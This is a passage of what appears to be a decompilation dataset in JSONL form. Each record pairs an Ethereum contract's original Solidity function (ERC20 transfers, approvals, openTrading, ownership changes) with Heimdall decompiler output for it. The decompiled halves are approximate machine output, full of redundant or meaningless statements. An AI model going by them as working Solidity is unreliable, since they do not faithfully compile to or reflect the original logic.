0x0300000000000000000000000000000000000000000000000000000000);\n        require(0 - (bytes1(storage_map_b[var_a])));\n        var_a = this.code[13919:13951];\n        var_a = var_a;\n        emit Transfer(address(storage_map_b[var_a]), 0, arg0);\n        store_g = 0x01 + store_g;\n        var_a = 0x03;\n        var_b = 0x69;\n        var_a = this.code[13887:13919];\n        var_a = var_a;\n        require(!store_i);\n        var_a = 0x03;\n        var_b = 0x69;\n        var_a = this.code[13887:13919];\n        var_a = var_a;\n        require(store_i);\n        var_a = var_a;\n        require(address(storage_map_j[var_a]) == 0);\n        var_a = 0x03;\n        var_b = 0x69;\n        var_a = this.code[13887:13919];\n        var_a = var_a;\n        require(store_i);\n        var_a = var_a;\n        var_c = 0xb68c437900000000000000000000000000000000000000000000000000000000;\n        address var_d = address(msg.sender);\n        uint256 var_e = 0;\n        uint256 var_f = arg0;\n        require(0x03 < 0x05);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x21;\n        var_h = 0x03;\n        require(address(storage_map_j[var_a]).code.length);\n        (bool success, bytes memory ret0) = address(storage_map_j[var_a]).{ value: var_e ether }Unresolved_b68c4379(var_d); // call\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x32;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x32;\n        var_a = var_f + 0x01;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        if (0 - storage_map_b[var_a]) {\n            require(0 - storage_map_b[var_a], CustomError_59c896be());\n        }\n        require(storage_map_b[var_a] == (address(msg.sender)) | (address(msg.sender) == (address(storage_map_b[var_a]))), CustomError_59c896be());\n        var_a = address(storage_map_b[var_a]);\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c47;\n        var_a = address(msg.sender);\n        address var_b = keccak256(var_a);\n        require(bytes1(storage_map_b[var_a]), CustomError_59c896be());\n        var_a = 0x59c896be00000000000000000000000000000000000000000000000000000000;\n        require(arg0 < totalSupply, CustomError_df2d9b42());\n        var_a = var_f + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        require(!storage_map_b[var_a], CustomError_df2d9b42());\n        require(0 - (bytes1(storage_map_b[var_a])), CustomError_df2d9b42());\n        var_a = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_a = (arg0 + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        require(!storage_map_b[var_a], CustomError_df2d9b42());\n        require(0 - (bytes1(storage_map_b[var_a])), CustomError_df2d9b42());\n        var_a = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_a = ((arg0 + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        require(!storage_map_b[var_a], CustomError_df2d9b42());\n        require(0 - (bytes1(storage_map_b[var_a])), CustomError_df2d9b42());\n        var_a = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_a = (((arg0 + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_b = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n        require(!storage_map_b[var_a], CustomError_df2d9b42());\n        require(0 - (bytes1(storage_map_b[var_a])), CustomError_df2d9b42());\n        var_a = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_a = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_a = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x436f6e7472616374206973206e6f742072656769737465726564206e6f72204f;\n        var_h = 0x776e657200000000000000000000000000000000000000000000000000000000;\n        require(address(owner) == msg.sender, \"Contract is not registered nor Owner\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x436f6e7472616374206973206e6f742072656769737465726564206e6f72204f;\n        var_h = 0x776e657200000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xEEF6196376173FC3F2BeDfe0cFcB355401e1Be51", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x6dcAfFa85fA06C617E8290f1BABC7091eEE8150f", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\\n        address owner = _msgSender();\\n        uint256 currentAllowance = allowance(owner, spender);\\n        require(currentAllowance >= subtractedValue, \\\"ERC20: decreased allowance below zero\\\");\\n        unchecked {\\n            _approve(owner, spender, currentAllowance - subtractedValue);\\n        }\\n\\n        return true;\\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_h = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        uint256 var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xAA37BDBBDa27BF560913F99C7B189D5B03583F7D", "original_solidity_code": "function symbol() public view  returns (string memory) {\r\n        return _tokenSSSsymbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_i) {\n            if (store_i - ((store_i >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_i >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_i >> 0x01;\n                if (store_i) {\n                    if (store_i - ((store_i >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_i >> 0x01) {\n                            if (0x1f < (store_i >> 0x01)) {\n                                var_a = 0x05;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_i >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xe150ed6520Ef0F5269a82638f344541e22298E51", "original_solidity_code": "function openTrading() external onlyOwner() {\\n        require(!tradingOpen,\\\"trading is already open\\\");\\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\n        _approve(address(this), address(uniswapV2Router), _tTotal);\\n        IUniswapV2Factory factory=IUniswapV2Factory(uniswapV2Router.factory());\\n        uniswapV2Pair = factory.getPair(address(this),uniswapV2Router.WETH());\\n        if(uniswapV2Pair==address(0x0)){\\n          uniswapV2Pair = factory.createPair(address(this), uniswapV2Router.WETH());\\n        }\\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\\n        swapEnabled = true;\\n        tradingOpen = true;\\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_c / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_e));\n        require(0x08, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x0f4240, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_l[var_e] = 0x0f4240;\n        var_a = 0x0f4240;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x0f4240);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_e).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_e / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xe6a4390500000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_e6a43905(var_d); // staticcall\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x08 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x08 < 0x4e)) | ((0x0a < 0x0133) & (0x08 < 0x20))) {\n                            if (!0x08 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x15C20cF168b7A84E9C56ADbf233b80Fc40090e7a", "original_solidity_code": "function name() public view virtual override returns (string memory) {\\r\\n        return _name;\\r\\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_c) {\n            if (store_c - ((store_c / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_c / 0x02;\n                if (store_c) {\n                    if (store_c - ((store_c / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c / 0x02) {\n                            if (0x1f < (store_c / 0x02)) {\n                                var_a = 0x68;\n                                var_e = storage_map_d[var_a];\n                                if ((0x20 + var_c) + (store_c / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x4D270302aB1fBcC453A865a6bFD8CD7C893a3d13", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n        firstBlock = block.number;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_f / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x17;\n        var_e = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_l = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_l));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require(!0x05f5e100 | (0x01 == 0x01), \"ERC20: approve to the zero address\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_l / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x22;\n        var_e = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_f = address(this);\n        var_i = 0x02;\n        var_f = address(store_l / 0x01);\n        address var_i = keccak256(var_f);\n        storage_map_m[var_f] = 0x05f5e100;\n        var_a = 0x05f5e100;\n        emit Approval(address(this), address(store_l / 0x01), 0x05f5e100);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_l / 0x01).factory(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_k = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_l / 0x01).WETH(var_d); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_l = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        address var_h = address(var_j);\n        (bool success, bytes memory ret0) = address(var_j).Unresolved_c9c65396(var_e); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x24;\n        var_e = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_g = 0x11;\n                            if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                if (!0x09 > 0x01) {\n                                    if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_g = 0x11;\n                                        if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_g = 0x11;\n                                            if (!0x01) {\n                                            }\n                                            if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xB2C8e6f566C64A20DE49B25553C312a050de52A3", "original_solidity_code": "function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x26;\n        var_f = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_g = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xAB17E21aaAaF60C9022E34e3AcdBC73EEeb0f880", "original_solidity_code": "function updateDevWallet(address newWallet) external onlyOwner {\r\n        emit devWalletUpdated(newWallet, devWallet);\r\n        devWallet = newWallet;\r\n    }", "heimdall_decompiled_code": "function updateDevWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit devWalletUpdated(address(arg0), address(devWallet));\n        devWallet = (address(arg0)) | (uint96(devWallet));\n    }"}
{"contract_address": "0xd4877eAc39dC23770c50dAbcB1F2BC6208893E92", "original_solidity_code": "function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender));\n        require(!arg1 < arg1);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        require(!0x64 > (~(arg1 - arg1)));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_b = 0x11;\n        var_c = 0x194a51d800000000000000000000000000000000000000000000000000000000;\n        address var_d = address(msg.sender);\n        address var_e = address(arg0);\n        require(address(store_d).code.length);\n        (bool success, bytes memory ret0) = address(store_d).{ value: 0 ether }Unresolved_194a51d8(var_d); // call\n        uint256 var_f = var_f + (uint248(ret0.length + 0x1f));\n        require(!((var_f + ret0.length) - var_f) < 0x20);\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x4a332C2EE399881195E10544033c2378E732e2C2", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n        owner = 0 | (uint96(owner));\n    }"}
{"contract_address": "0x3f91B8467d1eE998DE6344903e2fDEB6252d4c8b", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)),0, 0, owner(), block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_h / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x17;\n        var_e = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_g = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_g));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require(!0x3b9aca00 | (0x01 == 0x01), \"ERC20: approve to the zero address\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_g / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x22;\n        var_e = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_f = address(this);\n        var_i = 0x02;\n        var_f = address(store_g / 0x01);\n        address var_i = keccak256(var_f);\n        storage_map_n[var_f] = 0x3b9aca00;\n        var_a = 0x3b9aca00;\n        emit Approval(address(this), address(store_g / 0x01), 0x3b9aca00);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_g / 0x01).factory(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_k = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_g / 0x01).WETH(var_d); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_l = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        address var_h = address(var_j);\n        (bool success, bytes memory ret0) = address(var_j).Unresolved_c9c65396(var_e); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x24;\n        var_e = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_g = 0x11;\n                            if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                if (!0x09 > 0x01) {\n                                    if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_g = 0x11;\n                                        if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_g = 0x11;\n                                            if (!0x01) {\n                                            }\n                                            if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xB347995c9f8c6C7197370bAFe96967c14F9Fdabe", "original_solidity_code": "function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x26;\n        var_f = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_g = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_c 